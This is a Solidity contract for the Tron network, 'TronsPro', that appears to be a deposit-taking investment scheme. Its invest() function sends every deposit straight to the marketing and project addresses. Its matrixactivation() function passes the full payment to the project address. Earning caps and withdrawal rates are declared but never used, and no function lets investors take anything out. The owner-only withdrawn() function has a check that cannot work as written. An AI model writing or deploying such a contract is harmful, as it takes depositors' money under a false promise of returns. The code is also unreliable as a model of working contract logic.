//SourceUnit: tronspro.1.0.sol

pragma solidity 0.5.10;

contract TronsPro {
	using SafeMath for uint256;
	
	uint256 public INVEST_MIN_AMOUNT = 300 trx;
	uint256 public BASE_PERCENT = 200;
	uint256 public MARKETING_FEE = 100;
	uint256 public PROJECT_BAL = 900;

	// earning capping
	uint256 public FIRST_CAPPING = 900;
	uint256 public SECOND_CAPPING = 1500;
    uint256 public THIRD_CAPPING = 3000;
    
    // withdrawn percents %
    uint256 public FIRST_WITHDRAWN_PER = 900;
	uint256 public SECOND_WITHDRAWN_PER = 600;
    uint256 public THIRD_WITHDRAWN_PER = 300;
    uint256 public FORTH_WITHDRAWN_PER = 100;
	
	uint256 public PERCENTS_DIVIDER = 1000;
	uint256 public TIME_STEP = 1 days; 
	
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	
	address payable public marketingAddress;
	address payable public projectAddress;
	
	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
	}
	
	struct Activation {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
	}
	
	struct User {
		Deposit[] deposits;
		Activation[] activations;
	}
	
	mapping(address => User) users;
	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event NewActivation(address indexed user, uint256 amount);
	event NewWithdrawn(address indexed user, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	
	constructor(address payable marketingAddr, address payable projectAddr) public {
		require(!isContract(marketingAddr) && !isContract(projectAddr));
		marketingAddress = marketingAddr;
		projectAddress = projectAddr; 
	}
	
	function invest() public payable {
		require(msg.value >= INVEST_MIN_AMOUNT,'Minimum investment 300 tron');
		
		marketingAddress.transfer(msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));
		projectAddress.transfer(msg.value.mul(PROJECT_BAL).div(PERCENTS_DIVIDER));
		emit FeePayed(msg.sender, msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));

		User storage user = users[msg.sender];

        user.deposits.push(Deposit(msg.value, 0, block.timestamp));

    	emit Newbie(msg.sender);
    	emit NewDeposit(msg.sender, msg.value);
	}
	
	function activation() public payable {
		require(msg.value >= INVEST_MIN_AMOUNT,'Minimum investment 300 tron');
		
		User storage user = users[msg.sender];
		
		marketingAddress.transfer(msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));
		emit FeePayed(msg.sender, msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));

        user.activations.push(Activation(msg.value, 0, block.timestamp));

    	emit NewActivation(msg.sender, msg.value);
	}

    function matrixactivation() public payable {
		require(msg.value >= INVEST_MIN_AMOUNT,'Minimum investment 300 tron');
		
		User storage user = users[msg.sender];
		
		projectAddress.transfer(msg.value);
	}
	
	function withdrawn() public payable {
	    if (msg.sender == projectAddress){
		    
			uint256 contractBalance = address(this).balance;
			
			require(msg.value > contractBalance,'Insufficient Contract Balance.');
			
			projectAddress.transfer(msg.value);
			
			emit NewWithdrawn(msg.sender, msg.value);
		}
	}
	
	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
	}
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}